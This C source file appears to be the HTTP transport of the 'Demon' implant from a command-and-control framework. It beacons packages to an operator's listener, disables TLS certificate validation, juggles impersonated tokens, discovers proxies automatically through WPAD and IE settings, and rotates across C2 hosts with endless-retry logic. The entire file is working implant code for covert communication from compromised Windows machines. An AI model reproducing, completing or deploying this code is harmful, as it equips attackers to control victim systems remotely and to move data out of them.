#include <Demon.h>

#include <Core/TransportHttp.h>
#include <Core/MiniStd.h>

#ifdef TRANSPORT_HTTP

BOOL HttpSend( PBUFFER Send, PBUFFER Response )
{
    BOOL    Success         = FALSE;
    HANDLE  hConnect        = NULL;
    HANDLE  hRequest        = NULL;

    LPWSTR  HttpHeader      = NULL;
    LPWSTR  HttpEndpoint    = NULL;
    DWORD   HttpFlags       = 0;
    LPCWSTR HttpProxy       = NULL;
    PWSTR   HttpScheme      = NULL;

    WINHTTP_PROXY_INFO                   ProxyInfo        = { 0 };
    WINHTTP_CURRENT_USER_IE_PROXY_CONFIG ProxyConfig      = { 0 };
    WINHTTP_AUTOPROXY_OPTIONS            AutoProxyOptions = { 0 };

    DWORD   Counter         = 0;
    DWORD   Iterator        = 0;
    DWORD   BufRead         = 0;
    UCHAR   Buffer[ 1024 ]  = { 0 };
    PVOID   RespBuffer      = NULL;
    SIZE_T  RespSize        = 0;
    BOOL    Successful      = TRUE;

    /* we might impersonate a token that lets WinHttpOpen return an Error 5 (ERROR_ACCESS_DENIED) */
    TokenImpersonate( FALSE );

    /* if we don't have any more hosts left, then exit */
    if ( ! Instance.Config.Transport.Host )
    {
        PUTS_DONT_SEND( "No hosts left to use... exit now." )
        CommandExit( NULL );
    }

    if ( ! Instance.hHttpSession )
    {
        if ( Instance.Config.Transport.Proxy.Enabled )
        {
            // Use preconfigured proxy
            HttpProxy = Instance.Config.Transport.Proxy.Url;

            /* PRINTF_DONT_SEND( "WinHttpOpen( %ls, WINHTTP_ACCESS_TYPE_NAMED_PROXY, %ls, WINHTTP_NO_PROXY_BYPASS, 0 )\n", Instance.Config.Transport.UserAgent, HttpProxy ) */
            Instance.hHttpSession = Instance.Win32.WinHttpOpen( Instance.Config.Transport.UserAgent, WINHTTP_ACCESS_TYPE_NAMED_PROXY, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
        }
        else
        {
            // Autodetect proxy settings
            /* PRINTF_DONT_SEND( "WinHttpOpen( %ls, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 )\n", Instance.Config.Transport.UserAgent ) */
            Instance.hHttpSession = Instance.Win32.WinHttpOpen( Instance.Config.Transport.UserAgent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 );
        }

        if ( ! Instance.hHttpSession )
        {
            PRINTF_DONT_SEND( "WinHttpOpen: Failed => %d\n", NtGetLastError() )
            Successful = FALSE;
            goto LEAVE;
        }
    }

    /* PRINTF_DONT_SEND( "WinHttpConnect( %x, %ls, %d, 0 )\n", Instance.hHttpSession, Instance.Config.Transport.Host->Host, Instance.Config.Transport.Host->Port ) */
    hConnect = Instance.Win32.WinHttpConnect( Instance.hHttpSession, Instance.Config.Transport.Host->Host, Instance.Config.Transport.Host->Port, 0 );
    if ( ! hConnect )
    {
        PRINTF_DONT_SEND( "WinHttpConnect: Failed => %d\n", NtGetLastError() )
        Successful = FALSE;
        goto LEAVE;
    }

    Counter = 0;
    while ( TRUE )
    {
        if ( ! Instance.Config.Transport.Uris[ Counter ] ) break;
        else Counter++;
    }

    HttpEndpoint = Instance.Config.Transport.Uris[ RandomNumber32() % Counter ];
    HttpFlags    = WINHTTP_FLAG_BYPASS_PROXY_CACHE;

    if ( Instance.Config.Transport.Secure )
        HttpFlags |= WINHTTP_FLAG_SECURE;

    /* PRINTF_DONT_SEND( "WinHttpOpenRequest( %x, %ls, %ls, NULL, NULL, NULL, %x )\n", hConnect, Instance.Config.Transport.Method, HttpEndpoint, HttpFlags ) */
    hRequest = Instance.Win32.WinHttpOpenRequest( hConnect, Instance.Config.Transport.Method, HttpEndpoint, NULL, NULL, NULL, HttpFlags );
    if ( ! hRequest )
    {
        PRINTF_DONT_SEND( "WinHttpOpenRequest: Failed => %d\n", NtGetLastError() )
        Successful = FALSE;
        goto LEAVE;
    }

    if ( Instance.Config.Transport.Secure )
    {
        HttpFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
                    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

        if ( ! Instance.Win32.WinHttpSetOption( hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &HttpFlags, sizeof( DWORD ) ) )
        {
            PRINTF_DONT_SEND( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
        }
    }

    /* Add our headers */
    Iterator = 0;
    do
    {
        HttpHeader = Instance.Config.Transport.Headers[ Iterator ];

        if ( ! HttpHeader )
            break;

        if ( ! Instance.Win32.WinHttpAddRequestHeaders( hRequest, HttpHeader, -1, WINHTTP_ADDREQ_FLAG_ADD ) ) {
            PRINTF_DONT_SEND( "Failed to add header: %ls", HttpHeader )
        }

        Iterator++;
    } while ( TRUE );

    if ( Instance.Config.Transport.Proxy.Enabled )
    {
        // Use preconfigured proxy
        ProxyInfo.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
        ProxyInfo.lpszProxy    = Instance.Config.Transport.Proxy.Url;

        if ( ! Instance.Win32.WinHttpSetOption( hRequest, WINHTTP_OPTION_PROXY, &ProxyInfo, sizeof( WINHTTP_PROXY_INFO ) ) )
        {
            PRINTF_DONT_SEND( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
        }

        if ( Instance.Config.Transport.Proxy.Username )
        {
            if ( ! Instance.Win32.WinHttpSetOption( hRequest, WINHTTP_OPTION_PROXY_USERNAME, Instance.Config.Transport.Proxy.Username, StringLengthW( Instance.Config.Transport.Proxy.Username ) ) )
            {
                PRINTF_DONT_SEND( "Failed to set proxy username %u", NtGetLastError() );
            }
        }

        if ( Instance.Config.Transport.Proxy.Password )
        {
            if ( ! Instance.Win32.WinHttpSetOption( hRequest, WINHTTP_OPTION_PROXY_PASSWORD, Instance.Config.Transport.Proxy.Password, StringLengthW( Instance.Config.Transport.Proxy.Password ) ) )
            {
                PRINTF_DONT_SEND( "Failed to set proxy password %u", NtGetLastError() );
            }
        }
    }
    else if ( ! Instance.LookedForProxy )
    {
        // Autodetect proxy settings using the Web Proxy Auto-Discovery (WPAD) protocol

        /*
         * NOTE: We use WinHttpGetProxyForUrl as the first option because
         *       WinHttpGetIEProxyConfigForCurrentUser can fail with certain users
         *       and also the documentation states that WinHttpGetIEProxyConfigForCurrentUser
         *       "can be used as a fall-back mechanism" so we are using it that way
         */

        AutoProxyOptions.dwFlags                = WINHTTP_AUTOPROXY_AUTO_DETECT;
        AutoProxyOptions.dwAutoDetectFlags      = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
        AutoProxyOptions.lpszAutoConfigUrl      = NULL;
        AutoProxyOptions.lpvReserved            = NULL;
        AutoProxyOptions.dwReserved             = 0;
        AutoProxyOptions.fAutoLogonIfChallenged = TRUE;

        if ( Instance.Win32.WinHttpGetProxyForUrl( Instance.hHttpSession, HttpEndpoint, &AutoProxyOptions, &ProxyInfo ) )
        {
            if ( ProxyInfo.lpszProxy ) {
                PRINTF_DONT_SEND( "Using proxy %ls\n", ProxyInfo.lpszProxy );
            }

            Instance.SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
            Instance.ProxyForUrl       = Instance.Win32.LocalAlloc( LPTR, Instance.SizeOfProxyForUrl );
            MemCopy( Instance.ProxyForUrl, &ProxyInfo, Instance.SizeOfProxyForUrl );
        }
        else
        {
            // WinHttpGetProxyForUrl failed, use WinHttpGetIEProxyConfigForCurrentUser as fall-back
            if ( Instance.Win32.WinHttpGetIEProxyConfigForCurrentUser( &ProxyConfig ) )
            {
                if ( ProxyConfig.lpszProxy != NULL && StringLengthW( ProxyConfig.lpszProxy ) != 0 )
                {
                    // IE is set to "use a proxy server"
                    ProxyInfo.dwAccessType    = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
                    ProxyInfo.lpszProxy       = ProxyConfig.lpszProxy;
                    ProxyInfo.lpszProxyBypass = ProxyConfig.lpszProxyBypass;

                    PRINTF_DONT_SEND( "Using IE proxy %ls\n", ProxyInfo.lpszProxy );

                    Instance.SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
                    Instance.ProxyForUrl       = Instance.Win32.LocalAlloc( LPTR, Instance.SizeOfProxyForUrl );
                    MemCopy( Instance.ProxyForUrl, &ProxyInfo, Instance.SizeOfProxyForUrl );

                    // don't cleanup these values
                    ProxyConfig.lpszProxy       = NULL;
                    ProxyConfig.lpszProxyBypass = NULL;
                }
                else if ( ProxyConfig.lpszAutoConfigUrl != NULL && StringLengthW( ProxyConfig.lpszAutoConfigUrl ) != 0 )
                {
                    // IE is set to "Use automatic proxy configuration"
                    AutoProxyOptions.dwFlags           = WINHTTP_AUTOPROXY_CONFIG_URL;
                    AutoProxyOptions.lpszAutoConfigUrl = ProxyConfig.lpszAutoConfigUrl;
                    AutoProxyOptions.dwAutoDetectFlags = 0;

                    PRINTF_DONT_SEND( "Trying to discover the proxy config via the config url %ls\n", AutoProxyOptions.lpszAutoConfigUrl );

                    if ( Instance.Win32.WinHttpGetProxyForUrl( Instance.hHttpSession, HttpEndpoint, &AutoProxyOptions, &ProxyInfo ) )
                    {
                        if ( ProxyInfo.lpszProxy ) {
                            PRINTF_DONT_SEND( "Using proxy %ls\n", ProxyInfo.lpszProxy );
                        }

                        Instance.SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
                        Instance.ProxyForUrl       = Instance.Win32.LocalAlloc( LPTR, Instance.SizeOfProxyForUrl );
                        MemCopy( Instance.ProxyForUrl, &ProxyInfo, Instance.SizeOfProxyForUrl );
                    }
                }
                else
                {
                    // IE is set to "automatically detect settings"
                    // ignore this as we already tried
                }
            }
        }

        Instance.LookedForProxy = TRUE;
    }

    if ( Instance.ProxyForUrl )
    {
        if ( ! Instance.Win32.WinHttpSetOption( hRequest, WINHTTP_OPTION_PROXY, Instance.ProxyForUrl, Instance.SizeOfProxyForUrl ) )
        {
            PRINTF_DONT_SEND( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
        }
    }

    /* Send package to our listener */
    if ( Instance.Win32.WinHttpSendRequest( hRequest, NULL, 0, Send->Buffer, Send->Length, Send->Length, 0 ) )
    {
        if ( Instance.Win32.WinHttpReceiveResponse( hRequest, NULL ) )
        {
            /* Is the server recognizing us ? are we good ?  */
            if ( HttpQueryStatus( hRequest) != HTTP_STATUS_OK )
            {
                PUTS_DONT_SEND( "HttpQueryStatus Failed: Is not HTTP_STATUS_OK (200)" )
                Successful = FALSE;
                goto LEAVE;
            }

            if ( Response )
            {
                RespBuffer = NULL;
                do
                {
                    Successful = Instance.Win32.WinHttpReadData( hRequest, Buffer, sizeof( Buffer ), &BufRead );
                    if ( ! Successful || BufRead == 0 )
                    {
                        break;
                    }

                    if ( ! RespBuffer )
                        RespBuffer = Instance.Win32.LocalAlloc( LPTR, BufRead );
                    else
                        RespBuffer = Instance.Win32.LocalReAlloc( RespBuffer, RespSize + BufRead, LMEM_MOVEABLE | LMEM_ZEROINIT );

                    RespSize += BufRead;

                    MemCopy( RespBuffer + ( RespSize - BufRead ), Buffer, BufRead );
                    MemSet( Buffer, 0, sizeof( Buffer ) );

                } while ( Successful == TRUE );

                Response->Length = RespSize;
                Response->Buffer = RespBuffer;

                Successful = TRUE;
            }
        }
    }
    else
    {
        if ( NtGetLastError() == 12029 ) // ERROR_INTERNET_CANNOT_CONNECT
            Instance.Session.Connected = FALSE;
        PRINTF_DONT_SEND( "HTTP Error: %d\n", NtGetLastError() )
        Successful = FALSE;
        goto LEAVE;
    }

    LEAVE:
    if ( hConnect )
        Instance.Win32.WinHttpCloseHandle( hConnect );

    if ( hRequest )
        Instance.Win32.WinHttpCloseHandle( hRequest );

    if ( ProxyConfig.lpszProxy )
        Instance.Win32.GlobalFree( ProxyConfig.lpszProxy );

    if ( ProxyConfig.lpszProxyBypass )
        Instance.Win32.GlobalFree( ProxyConfig.lpszProxyBypass );

    if ( ProxyConfig.lpszAutoConfigUrl )
        Instance.Win32.GlobalFree( ProxyConfig.lpszAutoConfigUrl );

    /* re-impersonate the token */
    TokenImpersonate( TRUE );

    if ( ! Successful )
    {
        /* if we hit our max then we use our next host */
        Instance.Config.Transport.Host = HostFailure( Instance.Config.Transport.Host );
    }

    return Successful;
}

/* Query status code from our server response */
DWORD HttpQueryStatus( HANDLE hRequest )
{
    DWORD StatusCode = 0;
    DWORD StatusSize = sizeof( DWORD );

    if ( Instance.Win32.WinHttpQueryHeaders(
            hRequest,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            WINHTTP_HEADER_NAME_BY_INDEX,
            &StatusCode, &StatusSize, WINHTTP_NO_HEADER_INDEX
    )
            )
    {
        return StatusCode;
    }

    return 0;
}

PHOST_DATA HostAdd( LPWSTR Host, SIZE_T Size, DWORD Port )
{
    PRINTF_DONT_SEND( "Host -> Host:[%ls] Size:[%ld] Port:[%ld]\n", Host, Size, Port );

    PHOST_DATA HostData = NULL;

    HostData       = NtHeapAlloc( sizeof( HOST_DATA ) );
    HostData->Host = NtHeapAlloc( Size + sizeof( WCHAR ) );
    HostData->Port = Port;
    HostData->Dead = FALSE;
    HostData->Next = Instance.Config.Transport.Hosts;

    /* Copy host to our buffer */
    MemCopy( HostData->Host, Host, Size );

    /* Add to hosts linked list */
    Instance.Config.Transport.Hosts = HostData;

    return HostData;
}

PHOST_DATA HostFailure( PHOST_DATA Host )
{
    if ( ! Host )
        return NULL;

    if ( Host->Failures == Instance.Config.Transport.HostMaxRetries )
    {
        /* we reached our max failed retries with our current host data
         * use next one */
        Host->Dead = TRUE;

        /* Get our next host based on our rotation strategy. */
        return HostRotation( Instance.Config.Transport.HostRotation );
    }

    /* Increase our failed counter */
    Host->Failures++;

    PRINTF_DONT_SEND( "Host [Host: %ls:%ld] failure counter increased to %d\n", Host->Host, Host->Port, Host->Failures )

    return Host;
}

/* Gets a random host from linked list. */
PHOST_DATA HostRandom()
{
    PHOST_DATA Host  = NULL;
    DWORD      Index = RandomNumber32() % HostCount();
    DWORD      Count = 0;

    Host = Instance.Config.Transport.Hosts;

    for ( ;; )
    {
        if ( Count == Index )
            break;

        if ( ! Host )
            break;

        /* if we are the end and still didn't found the random index quit. */
        if ( ! Host->Next )
        {
            Host = NULL;
            break;
        }

        Count++;

        /* Next host please */
        Host = Host->Next;
    }

    PRINTF_DONT_SEND( "Index: %d\n", Index )
    PRINTF_DONT_SEND( "Host : %p (%ls:%ld :: Dead[%s] :: Failures[%d])\n", Host, Host->Host, Host->Port, Host->Dead ? "TRUE" : "FALSE", Host->Failures )

    return Host;
}

PHOST_DATA HostRotation( SHORT Strategy )
{
    PHOST_DATA Host = NULL;

    if ( Strategy == TRANSPORT_HTTP_ROTATION_ROUND_ROBIN )
    {
        DWORD Count = 0;

        /* get linked list */
        Host = Instance.Config.Transport.Hosts;

        /* If our current host is empty
         * then return the top host from our linked list. */
        if ( ! Instance.Config.Transport.Host )
            return Host;

        for ( Count = 0; Count < HostCount();  )
        {
            /* check if it's not an emtpy pointer */
            if ( ! Host )
                break;

            /* if the host is dead (max retries limit reached) then continue */
            if ( Host->Dead )
                Host = Host->Next;
            else break;
        }
    }
    else if ( Strategy == TRANSPORT_HTTP_ROTATION_RANDOM )
    {
        /* Get a random Host */
        Host = HostRandom();

        /* if we fail use the first host we get available. */
        if ( Host->Dead )
            /* fallback to Round Robin */
            Host = HostRotation( TRANSPORT_HTTP_ROTATION_ROUND_ROBIN );
    }

    /* if we specified infinite retries then reset every "Failed" retries in our linked list and do this forever...
     * as the operator wants. */
    if ( ( Instance.Config.Transport.HostMaxRetries == 0 ) && ! Host )
    {
        PUTS_DONT_SEND( "Specified to keep going. To infinity... and beyond" )

        /* get linked list */
        Host = Instance.Config.Transport.Hosts;

        /* iterate over linked list */
        for ( ;; )
        {
            if ( ! Host )
                break;

            /* reset failures */
            Host->Failures = 0;
            Host->Dead     = FALSE;

            Host = Host->Next;
        }

        /* tell the caller to start at the beginning */
        Host = Instance.Config.Transport.Hosts;
    }

    return Host;
}

DWORD HostCount()
{
    PHOST_DATA Host  = NULL;
    PHOST_DATA Head  = NULL;
    DWORD      Count = 0;

    Head = Instance.Config.Transport.Hosts;
    Host = Head;

    do {

        if ( ! Host )
            break;

        Count++;

        Host = Host->Next;

        /* if we are at the beginning again then stop. */
        if ( Head == Host )
            break;

    } while ( TRUE );

    return Count;
}

BOOL HostCheckup()
{
    PHOST_DATA Host  = NULL;
    PHOST_DATA Head  = NULL;
    DWORD      Count = 0;
    BOOL       Alive = TRUE;

    Head = Instance.Config.Transport.Hosts;
    Host = Head;

    do {
        if ( ! Host )
            break;

        if ( Host->Dead )
            Count++;

        Host = Host->Next;

        /* if we are at the beginning again then stop. */
        if ( Head == Host )
            break;
    } while ( TRUE );

    /* check if every host is dead */
    if ( HostCount() == Count )
        Alive = FALSE;

    return Alive;
}
#endif
